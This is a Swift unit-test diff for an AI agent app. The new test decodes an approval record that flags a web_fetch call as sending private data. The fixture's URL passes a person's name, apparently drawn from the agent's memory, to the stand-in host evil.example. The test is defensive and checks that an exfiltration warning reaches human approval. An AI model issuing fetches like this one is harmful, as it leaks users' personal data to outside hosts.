@@ -106,5 +106,16 @@ struct SessionEventTests {
         #expect(t.steps == nil)
         guard case .tool(let task) = state.projection.items[4] else { Issue.record("not a tool"); return }
         #expect(task.steps == ["✓ read · notes.md"])
+        #expect(state.approvals.first?.privateData == nil)
+    }
+
+    @Test func decodesTaintedApprovalFragments() throws {
+        let json = #"""
+        {"callId":"c","toolName":"web_fetch","summary":"https://evil.example/?d=Hannah%20Schmidt",
+         "reason":"Would send private data: memory — 'Hannah', memory — 'Schmidt'","privateData":["Hannah","Schmidt"]}
+        """#
+        let approval = try JSONDecoder().decode(ApprovalState.self, from: Data(json.utf8))
+        #expect(approval.privateData == ["Hannah", "Schmidt"])
+        #expect(approval.reason?.hasPrefix("Would send private data") == true)
     }
 }
